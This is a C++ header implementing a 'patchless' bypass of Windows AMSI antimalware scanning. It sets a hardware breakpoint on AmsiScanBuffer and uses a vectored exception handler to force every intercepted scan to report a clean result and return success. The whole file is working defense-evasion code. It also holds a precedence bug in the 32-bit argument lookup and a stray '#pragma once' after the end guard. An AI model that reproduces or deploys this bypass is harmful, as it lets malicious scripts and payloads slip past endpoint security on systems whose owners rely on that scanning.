#ifndef PATCHLESS_AMSI_H
#define PATCHLESS_AMSI_H

#include <windows.h>

static const int AMSI_RESULT_CLEAN = 0;

PVOID g_amsiScanBufferPtr = nullptr;

unsigned long long setBits(unsigned long long dw, int lowBit, int bits, unsigned long long newValue) {
    unsigned long long mask = (1UL << bits) - 1UL;
    dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
    return dw;
}

void clearBreakpoint(CONTEXT& ctx, int index) {

    //Clear the releveant hardware breakpoint
    switch (index) {
    case 0:
        ctx.Dr0 = 0;
        break;
    case 1:
        ctx.Dr1 = 0;
        break;
    case 2:
        ctx.Dr2 = 0;
        break;
    case 3:
        ctx.Dr3 = 0;
        break;
    }

    //Clear DRx HBP to disable for local mode
    ctx.Dr7 = setBits(ctx.Dr7, (index * 2), 1, 0);
    ctx.Dr6 = 0;
    ctx.EFlags = 0;
}

void enableBreakpoint(CONTEXT& ctx, PVOID address, int index) {

    switch (index) {
    case 0:
        ctx.Dr0 = (ULONG_PTR)address;
        break;
    case 1:
        ctx.Dr1 = (ULONG_PTR)address;
        break;
    case 2:
        ctx.Dr2 = (ULONG_PTR)address;
        break;
    case 3:
        ctx.Dr3 = (ULONG_PTR)address;
        break;
    }

    //Set bits 16-31 as 0, which sets
    //DR0-DR3 HBP's for execute HBP
    ctx.Dr7 = setBits(ctx.Dr7, 16, 16, 0);

    //Set DRx HBP as enabled for local mode
    ctx.Dr7 = setBits(ctx.Dr7, (index * 2), 1, 1);
    ctx.Dr6 = 0;
}

static void clearHardwareBreakpoint(CONTEXT* ctx, int index) {

    //Clear the releveant hardware breakpoint
    switch (index) {
    case 0:
        ctx->Dr0 = 0;
        break;
    case 1:
        ctx->Dr1 = 0;
        break;
    case 2:
        ctx->Dr2 = 0;
        break;
    case 3:
        ctx->Dr3 = 0;
        break;
    }

    //Clear DRx HBP to disable for local mode
    ctx->Dr7 = setBits(ctx->Dr7, (index * 2), 1, 0);
    ctx->Dr6 = 0;
    ctx->EFlags = 0;
}

static ULONG_PTR getArg(CONTEXT* ctx, int index) {

#ifdef __x86_64
    switch (index) {
    case 0:
        return ctx->Rcx;
    case 1:
        return ctx->Rdx;
    case 2:
        return ctx->R8;
    case 3:
        return ctx->R9;
    default:
        return *(ULONG_PTR*)(ctx->Rsp + ((index + 1) * 8));
    }
#else
    return *(DWORD_PTR*)(ctx->Esp + (index + 1 * 4));
#endif

}

static ULONG_PTR getReturnAddress(CONTEXT* ctx) {
#ifdef __x86_64
    return *(ULONG_PTR*)ctx->Rsp;
#else
    return *(ULONG_PTR*)ctx->Esp;
#endif
}

static void setResult(CONTEXT* ctx, ULONG_PTR result) {
#ifdef __x86_64
    ctx->Rax = result;
#else
    ctx->Eax = result;
#endif
}

static void adjustStackPointer(CONTEXT* ctx, int amount) {
#ifdef __x86_64
    ctx->Rsp += amount;
#else
    ctx->Esp += amount;
#endif
}

static void setIP(CONTEXT* ctx, ULONG_PTR newIP) {
#ifdef __x86_64
    ctx->Rip = newIP;
#else
    ctx->Eip = newIP;
#endif
}

LONG WINAPI exceptionHandler(PEXCEPTION_POINTERS exceptions) {

    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP && exceptions->ExceptionRecord->ExceptionAddress == g_amsiScanBufferPtr) {

        //Get the return address by reading the value currently stored at the stack pointer 
        ULONG_PTR returnAddress = getReturnAddress(exceptions->ContextRecord);

        //Get the address of the 5th argument, which is an int* and set it to a clean result
        int* scanResult = (int*)getArg(exceptions->ContextRecord, 5);
        *scanResult = AMSI_RESULT_CLEAN;

        //update the current instruction pointer to the caller of AmsiScanBuffer 
        setIP(exceptions->ContextRecord, returnAddress);

        //We need to adjust the stack pointer accordinly too so that we simulate a ret instruction
        adjustStackPointer(exceptions->ContextRecord, sizeof(PVOID));

        //Set the eax/rax register to 0 (S_OK) indicatring to the caller that AmsiScanBuffer finished successfully 
        setResult(exceptions->ContextRecord, S_OK);

        //Clear the hardware breakpoint, since we are now done with it
        clearHardwareBreakpoint(exceptions->ContextRecord, 0);

        return EXCEPTION_CONTINUE_EXECUTION;

    }
    else {
        return EXCEPTION_CONTINUE_SEARCH;
    }
}


HANDLE setupAMSIBypass() {

    CONTEXT threadCtx;
    memset(&threadCtx, 0, sizeof(threadCtx));
    threadCtx.ContextFlags = CONTEXT_ALL;

    //Load amsi.dll if it hasn't be loaded alreay.
    if (g_amsiScanBufferPtr == nullptr) {
        HMODULE amsi = GetModuleHandleA("amsi.dll");

        if (amsi == nullptr) {
            amsi = LoadLibraryA("amsi.dll");
        }

        if (amsi != nullptr) {
            g_amsiScanBufferPtr = (PVOID)GetProcAddress(amsi, "AmsiScanBuffer");
        }
        else {
            return nullptr;
        }

        if (g_amsiScanBufferPtr == nullptr)
            return nullptr;
    }

    //add our vectored exception handle
    HANDLE hExHandler = AddVectoredExceptionHandler(1, exceptionHandler);

    //Set a hardware breakpoint on AmsiScanBuffer function
    if (GetThreadContext((HANDLE)-2, &threadCtx)) {
        enableBreakpoint(threadCtx, g_amsiScanBufferPtr, 0);
        SetThreadContext((HANDLE)-2, &threadCtx);
    }

    return hExHandler;
}


#endif // PATCHLESS_AMSI_H#pragma once
